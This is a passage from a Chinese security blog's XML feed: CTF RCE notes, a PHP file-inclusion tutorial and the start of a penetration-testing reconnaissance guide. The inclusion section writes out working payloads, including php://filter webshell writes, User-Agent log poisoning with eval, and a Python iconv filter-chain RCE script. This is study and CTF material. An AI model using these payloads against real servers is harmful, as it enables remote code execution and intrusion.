plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?= system(&quot;tac fla&#x27;&#x27;g.php&quot;);?&gt;</span><br></pre></td></tr></table></figure><h2 id="web40-无参RCE"><a href="#web40-无参RCE" class="headerlink" title="web40 无参RCE"></a>web40 无参RCE</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/posts/e8ab.html"/>
      <url>/posts/e8ab.html</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="LFI（本地文件包含）"><a href="#LFI（本地文件包含）" class="headerlink" title="LFI（本地文件包含）"></a>LFI（本地文件包含）</h2><p>(local file include) 本地文件包含。文件包含分为两种，一种是本地文件包含，一种是远程文件包含。很好理解，本地文件包含就是只能包含服务器中有的文件，而远程文件包含就是可以远程包含别的服务器的文件。这里一下就能知道。远程文件包含的危害肯定是大于本地文件包含的。</p><h2 id="文件包含的定义"><a href="#文件包含的定义" class="headerlink" title="文件包含的定义"></a>文件包含的定义</h2><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行。注意我们这里的定义，<code>包含的文件不一定是后缀为php的文件，可以是任意文件类型</code>，只要其他含有php代码且语法正常那么系统都会把它当作一个php文件进行执行。所以我们可以<code>使用图片马加上文件包含达到getshell</code> 的操作。使用一般都比较的多，比如我们写多个页面，页头和页尾都使用相同的文件，那我们就没必要写这个重复的代码，只需要写一份文件然后再其他代码中直接包含进去。有利于代码复用。如果文件包含的文件类型是php的话会直接执行php的代码。如果他包含的是一个文本，那他就会直接把内容显示。</p><h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><p><strong>PHP文件包含函数</strong>：</p><ol><li>include：<ul><li>包含并运行指定文件，在包含过程中出错会报错，<strong>不影响</strong>执行后续语句</li></ul></li><li>include_once：<pre><code>- 仅包含一次文件。会检查文件是否被包含过，若已被包含则不会再次包含</code></pre></li><li>require：<pre><code>- 在包含过程中出错，就会直接退出，**不执行**后续语句</code></pre></li><li>require_once：<pre><code>- 和 require 完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含</code></pre></li></ol><h2 id="文件包含的绕过"><a href="#文件包含的绕过" class="headerlink" title="文件包含的绕过"></a>文件包含的绕过</h2><h3 id="伪协议的妙用"><a href="#伪协议的妙用" class="headerlink" title="伪协议的妙用"></a>伪协议的妙用</h3><ul><li><p>伪协议的运用：<a href="https://na0h.cn/2021/02/25/php伪协议/">伪协议的学习</a>、<a href="https://www.php.net/manual/zh/wrappers.php">PHP: 支持的协议和封装协议</a></p><pre><code>- 过滤器filter://读文件：`?file=php://filter/convert.base64-encode/resource=flag.php`</code></pre><ul><li><p>data://： 某些字符串被过滤，可以使用data协议编码后传入 如：php被替换为???，那么可以传入</p><pre><code>  <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs</span><br></pre></td></tr></table></figure></code></pre><blockquote><ol><li><p>convert.base64-deconde</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/write=convert.base64-decode/resource=shell.phpcontent=abPD9waHAgQGV2YWwoJF9SRVFVRVNUWzFdKT8+</span><br></pre></td></tr></table></figure></li><li><p>rot13</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/write=string.rot13/resource=shell.php(要进行两次url全编码)</span><br><span class="line">content=&lt;?php system(‘tac flag.php’);?&gt; （rot13）</span><br></pre></td></tr></table></figure></li><li><p>或者是filter协议写入</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php(要进行两次url全编码)</span><br><span class="line">content=&lt;?php @eval($_REQUEST[1]);?&gt;  （base64编码）</span><br></pre></td></tr></table></figure></li></ol></blockquote></li></ul></li></ul><h3 id="日志包含拿shell"><a href="#日志包含拿shell" class="headerlink" title="日志包含拿shell"></a>日志包含拿shell</h3><p>一些日志文件默认路径：</p><ol><li>nginx日志文件：/var/log/nginx/access.log</li><li>apache日志文件：/var/log/ apache | apache2 | httpd /access.log</li><li>iis日志文件：%systemroot%\system32\logfiles\</li></ol><p>下面用的是nginx的日志文件路径：/var/log/nginx/access.log</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在ua头写一句话，再传参包含即可</span><br><span class="line">user_agent：<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_post</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br><span class="line">然后：</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure><p><strong>ps：</strong></p><ol><li><strong>日志包含尽量一次成功，不然错误代码会影响后面代码解析</strong> <strong>可以事先在本地试一下再传</strong></li><li><strong>在Ua中传入不会进行解码，因此编码绕过是无效的</strong> <strong>而在url中写入则会被url编码，没到达php就会被写入日志文件，同样不行</strong></li></ol><h3 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h3><p><a href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含和反序列化渗透 - FreeBuf网络安全行业门户</a></p><p>利用条件：</p><ol><li>存在文件包含漏洞 or session反序列化漏洞</li><li>知道session文件存放路径，可以尝试默认路径</li><li>具有读取和写入session文件的权限</li></ol><p>由于php.ini默认配置的关系</p><ol><li><p><code>session.use_strict_mode默认值为0</code>， 此时用户可以自己定义Session ID 如：设置cookie：<code>PHPSESSID=hhh</code>，那么PHP会在服务器上创建一个文件：<code>/tmp/sess_hhh</code></p><blockquote><p>即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值由ini.get(“session.upload<em>progress.prefix”)+由我们构造的session.upload_progress.name值组成， 最后被写入sess</em>文件里</p></blockquote></li><li><p><code>session.upload_progress.cleanup = on</code> 会导致文件上传后，session文件内容立即清空 可以利用条件竞争，在session内容被清空前进行包含</p></li></ol><h3 id="协议绕过"><a href="#协议绕过" class="headerlink" title="协议绕过"></a>协议绕过</h3><blockquote><p><code>allow_url_fopen</code> 和 <code>allow_url_include</code> 主要是针对 <code>http</code> <code>ftp</code> 两种协议起作用， 因此可以使用SMB、WebDav协议等方式来绕过限制。</p></blockquote><h3 id="利用ssrf读取文件"><a href="#利用ssrf读取文件" class="headerlink" title="利用ssrf读取文件"></a>利用ssrf读取文件</h3><p><a href="https://www.jianshu.com/p/7fab00c11770">php curl实现发送get和post请求 - 简书 (jianshu.com)</a></p><h2 id="phar文件包含"><a href="#phar文件包含" class="headerlink" title="phar文件包含"></a>phar文件包含</h2><p>详情、例题请看php反序列化内笔记。</p><h2 id="PHP7卡临时文件包含"><a href="#PHP7卡临时文件包含" class="headerlink" title="PHP7卡临时文件包含"></a>PHP7卡临时文件包含</h2><p><a href="https://blog.csdn.net/qq_62989306/article/details/125114940">https://blog.csdn.net/qq_62989306/article/details/125114940</a></p><h2 id="LFI-RCE"><a href="#LFI-RCE" class="headerlink" title="LFI RCE"></a>LFI RCE</h2><p><a href="https://articles.zsxq.com/id_wx85v4auoqam.html">https://articles.zsxq.com/id_wx85v4auoqam.html</a></p><ol><li>利用pearcmd.php，在tmp或者某可写目录下面生成一个webshell然后包含导致rce</li></ol><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</a></p><ol><li>利用php://filter/的各种编码直接rce</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#参数file</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.190.191/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">file_to_use = <span class="string">&quot;index&quot;</span></span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line"></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span></span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line"></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line"></span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line"></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line"></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line"></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(final_payload)</span><br><span class="line"></span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line"></span><br><span class="line">    \<span class="comment">#&quot;action&quot;: &quot;include&quot;,</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试资产信息收集</title>
      <link href="/posts/4846.html"/>
      <url>/posts/4846.html</url>
      
        <content type="html"><![CDATA[<h1 id="渗透的本质是信息收集"><a href="#渗透的本质是信息收集" class="headerlink" title="渗透的本质是信息收集"></a>渗透的本质是信息收集</h1><h2 id="信息收集也叫做资产收集"><a href="#信息收集也叫做资产收集" class="headerlink" title="信息收集也叫做资产收集"></a>信息收集也叫做资产收集</h2><p>信息收集是渗透测试的前期主要工作，是非常重要的环节，收集足够多的信息才能方便接下来的测试，信息收集主要是收集网站的域名信息、子域名信息、目标网站信息、目标网站真实IP、敏感/目录文件、开放端口和中间件信息等等。通过各种渠道和手段尽可能收集到多的关于这个站点的信息，有助于我们更多的去找到渗透点，突破口。</p><h3 id="信息收集的分类"><a href="#信息收集的分类" class="headerlink" title="信息收集的分类"></a>信息收集的分类</h3><ol><li>服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</li><li>网站指纹识别（包括，cms，cdn，证书等） dns记录</li><li>whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</li><li>子域名收集，旁站，C段等</li><li>google hacking针对化搜索，word/电子表格/pdf文件，中间件版本，弱口令扫描等</li><li>扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</li><li>传输协议，通用漏洞，exp，github源码等</li></ol><h3 id="常见的方法"><a href="#常见的方法" class="headerlink" title="常见的方法"></a>常见的方法</h3><ol><li>whois查询<br> 域名在注册的时候 需要填入个人或者企业信息 如果没有设置隐藏属性可以查询出来 通过备案号 查询个人或者企业信息 也可以whois反查注册人 邮箱 电话 机构 反查更多得域名和需要得信息。</li><li>收集子域名<br> 域名分为根域名和子域名，相对而言子域名的服务更好突破</li><li>端口扫描<br> 服务器需要开放服务，就必须开启端口，常见的端口是tcp 和udp两种类型<br> 范围 0-65535 通过扫得到的端口，访问服务 规划下一步渗透。</li><li>查找真实ip<br> 企业的网站，为了提高访问速度，或者避免黑客攻击，用了cdn服务，用了cdn之后真实服务器ip会被隐藏。</li><li>探测旁站及C段<br> 旁站:一个服务器上有多个网站 通过ip查询服务器上的网站c段:查找同一个段 服务器上的网站。可以找到同样网站的类型和服务器，也可以获取同段服务器进行下一步渗透。</li><li>网络空间搜索引擎<br> 通过这些引擎查找网站或者服务器的信息，进行下一步渗透。</li><li>扫描敏感目录/文件<br> 通过扫描目录和文件，大致了解网站的结构，获取突破点，比如后台，文件备份，上传点。</li><li>指纹识别<br> 获取网站的版本，属于那些cms管理系统，查找漏洞exp，下载cms进行代码审计。</li></ol><h2 id="在线whois查询"><a href="#在线whois查询" class="headerlink" title="在线whois查询"></a>在线whois查询</h2><p>通过whois来对域名信息进行查询，可以查到注册商、注册人、邮箱、DNS解析服务器、注册人联系电话等，因为有些网站信息查得到，有些网站信息查不到，所以推荐以下信息比较全的查询网站，直接输入目标站点即可查询到相关信息。</p><h3 id="域名注册信息"><a href="#域名注册信息" class="headerlink" title="域名注册信息"></a>域名注册信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">站长之家域名WHOIS信息查询地址 http://whois.chinaz.com/</span><br><span class="line">爱站网域名WHOIS信息查询地址 https://whois.aizhan.com/</span><br><span class="line">腾讯云域名WHOIS信息查询地址 https://whois.cloud.tencent.com/</span><br><span class="line">美橙互联域名WHOIS信息查询地址 https://whois.cndns.com/</span><br><span class="line">爱名网域名WHOIS信息查询地址 https://www.22.cn/domain/</span><br><span class="line">易名网域名WHOIS信息查询地址 https://whois.ename.net/</span><br><span class="line">中国万网域名WHOIS信息查询地址 https://whois.aliyun.com/</span><br><span class="line">西部数码域名WHOIS信息查询地址 https://whois.west.cn/</span><br><span class="line">新网域名WHOIS信息查询地址 http://whois.xinnet.com/domain/whois/index.jsp</span><br><span class="line">纳网域名WHOIS信息查询地址 http://whois.nawang.cn/</span><br><span class="line">中资源域名WHOIS信息查询地址 https://www.zzy.cn/domain/whois.html</span><br><span class="line">三五互联域名WHOIS信息查询地址 https://cp.35.com/chinese/whois.php</span><br><span class="line">新网互联域名WHOIS信息查询地址 http://www.dns.com.cn/show/domain/whois/index.do</span><br><span class="line">国外WHOIS信息查询地址 https://who.is/</span><br></pre></td></tr></table></figure><h3 id="在线网站备案查询"><a href="#在线网站备案查询" class="headerlink" title="在线网站备案查询"></a>在线网站备案查询</h3><p>网站备案信息是根据国家法律法规规定，由网站所有者向国家有关部门申请的备案，如果需要查询企业备案信息（单位名称、备案编号、网站负责人、电子邮箱、联系电话、法人等），推荐以下网站查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">天眼查 https://www.tianyancha.com/</span><br><span class="line">ICP备案查询网 http://www.beianbeian.com/</span><br><span class="line">爱站备案查询 https://icp.aizhan.com/</span><br><span class="line">域名助手备案信息查询 http://cha.fute.com/index</span><br></pre></td></tr></table></figure><h2 id="一些关于域名的前置小知识"><a href="#一些关于域名的前置小知识" class="headerlink" title="一些关于域名的前置小知识"></a>一些关于域名的前置小知识</h2><h3 id="域名的级别"><a href="#域名的级别" class="headerlink" title="域名的级别"></a>域名的级别</h3><p>acbug.com 根域名 顶级域名<br>mail.acbug.com 子域名 也叫二级域名<br>ctf.mail.acbug.com 子域名 也叫三级域名 四级如此类推</p><h3 id="域名的解析类型"><a href="#域名的解析类型" class="headerlink" title="域名的解析类型"></a>域名的解析类型</h3><p>域名解析就是国际域名或者国内域名以及中文域名等域名申请后做的到P地址的转换过程。P地址是网路上标识您站点的数字地址，为了简单好记，采用域名来代替i地址标识站点地址。域名的解析工作由DNS服务器完成。</p><p>相应的就有一些关于域名的记录<br>A记录、别名记录(CNAME)、MX记录、TXT记录、NS记录：</p><h4 id="A-Address-记录："><a href="#A-Address-记录：" class="headerlink" title="A (Address) 记录："></a>A (Address) 记录：</h4><p>是用来指定主机名（或域名）对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的web server上。同时也可以设置您域名的二级域名。</p><h4 id="别名-CNAME-记录："><a href="#别名-CNAME-记录：" class="headerlink" title="别名(CNAME)记录："></a>别名(CNAME)记录：</h4><p>也被称为规范名字。这种记录允许您将多个名字映射到同一台计算机。通常用于同时提供WWW和MAIL服务的计算机。例如，有一台计算机名为“host.mydomain.com”（A记录）。它同时提供WWW和MAIL服务，为了便于用户访问服务。可以为该计算机设置两个别名（CNAME）：WWW和MAIL。这两个别名的全称就是<code>www.mydomain.com</code>和<code>mail.mydomain.com</code>。实际上他们都指向<code>host.mydomain.com</code>。<br>同样的方法可以用于当您拥有多个域名需要指向同一服务器IP，此时您就可以将一个域名做A记录指向服务器IP然后将其他的域名做别名到之前做A记录的域名上，那么当您的服务器IP地址变更时您就可以不必麻烦的一个一个域名更改指向了 只需要更改做A记录的那个域名其他做别名的那些域名的指向也将自动更改到新的IP地址上了。</p><h4 id="如何检测CNAME记录？"><a href="#如何检测CNAME记录？" class="headerlink" title="如何检测CNAME记录？"></a>如何检测CNAME记录？</h4><ol><li>进入命令状态；（开始菜单 - 运行 - CMD[回车]）；</li><li>输入命令” nslookup -q=cname 这里填写对应的域名或二级域名”，查看返回的结果与设置的是否一致即可。</li></ol><h4 id="MX（Mail-Exchanger）记录："><a href="#MX（Mail-Exchanger）记录：" class="headerlink" title="MX（Mail Exchanger）记录："></a>MX（Mail Exchanger）记录：</h4><p>是邮件交换记录，它指向一个邮件服务器，用于电子邮件系统发邮件时根据 收信人的地址后缀来定位邮件服务器。例如，当Internet上的某用户要发一封信给 <code>user@mydomain.com</code> 时，该用户的邮件系统通过DNS查找mydomain.com这个域名的MX记录，如果MX记录存在， 用户计算机就将邮件发送到MX记录所指定的邮件服务器上。</p><h4 id="什么是TXT记录？："><a href="#什么是TXT记录？：" class="headerlink" title="什么是TXT记录？："></a>什么是TXT记录？：</h4><p>TXT记录一般指为某个主机名或域名设置的说明，如：</p><ol><li>admin IN TXT “jack, mobile:13800138000”；</li><li>mail IN TXT “邮件主机, 存放在xxx ,管理人：AAA”，Jim IN TXT “contact: <code>abc@mailserver.com</code></li></ol><p>也就是您可以设置 TXT ，以便使别人联系到您。</p><p>如何检测TXT记录？</p><ol><li>进入命令状态；（开始菜单 - 运行 - CMD[回车]）；</li><li>输入命令” nslookup -q=txt 这里填写对应的域名或二级域名”，查看返回的结果与设置的是否一致即可。</li></ol><h4 id="什么是NS记录？"><a href="#什么是NS记录？" class="headerlink" title="什么是NS记录？"></a>什么是NS记录？</h4><p>ns记录全称为Name Server 是一种域名服务器记录，用来明确当前你的域名是由哪个DNS服务器来进行解析的。</p><h2 id="旁站和C段"><a href="#旁站和C段" class="headerlink" title="旁站和C段"></a>旁站和C段</h2><p>旁站往往存在业务功能站点，建议先收集已有IP的旁站，再探测C段，确认C段目标后，再在C段的基础上再收集一次旁站。</p><p>旁站是和已知目标站点在同一服务器但不同端口的站点，通过以下方法搜索到旁站后，先访问一下确定是不是自己需要的站点信息。</p><h3 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h3><h4 id="同服查询"><a href="#同服查询" class="headerlink" title="同服查询"></a>同服查询</h4><p>站长之家 同ip网站查询 <a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a><br><a href="https://chapangzhan.com/">https://chapangzhan.com/</a><br><a href="http://dns.bugscaner.com/">http://dns.bugscaner.com/</a><br>google hacking <a href="https://blog.csdn.net/qq_36119192/article/details/84029809">https://blog.csdn.net/qq_36119192/article/details/84029809</a></p><h4 id="c端查询"><a href="#c端查询" class="headerlink" title="c端查询"></a>c端查询</h4><p>网络空间搜索引擎：</p><p>FOFA ip=’x.x.x.x/24’ shadan net:’x.x.x.x/24’<br>该方法效率较高，并能够直观地看到站点标题，但也有不常见端口未收录的情况，虽然这种情况很少，但之后补充资产的时候可以用下面的方法nmap扫描再收集一遍。</p><p>在线c段 webscan.cc<br>webscan.cc <a href="https://c.webscan.cc/">https://c.webscan.cc/</a></p><p>Nmap,Msscan扫描等<br>例如：nmap -p 80,443,8000,8080 -Pn 192.168.0.0/24</p><p>注意：探测C段时一定要确认ip是否归属于目标，因为一个C段中的所有ip不一定全部属于目标。</p><h4 id="查找厂商ip段"><a href="#查找厂商ip段" class="headerlink" title="查找厂商ip段"></a>查找厂商ip段</h4><p><a href="http://ipwhois.cnnic.net.cn/index.jsp">http://ipwhois.cnnic.net.cn/index.jsp</a></p><h2 id="收集子域名"><a href="#收集子域名" class="headerlink" title="收集子域名"></a>收集子域名</h2><h3 id="子域名作用"><a href="#子域名作用" class="headerlink" title="子域名作用"></a>子域名作用</h3><p>收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。</p><h3 id="常用收集姿势"><a href="#常用收集姿势" class="headerlink" title="常用收集姿势"></a>常用收集姿势</h3><p>子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城，其他管理系统，网站管理后台也有可能出现子域名中。</p><p>首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。</p><p>查找目标域名信息的方法有：</p><h4 id="在线网站："><a href="#在线网站：" class="headerlink" title="在线网站："></a>在线网站：</h4><p>站长之家，直接搜索名称或者网站域名即可查看相关信息： <a href="http://tool.chinaz.com/">http://tool.chinaz.com/</a><br>钟馗之眼 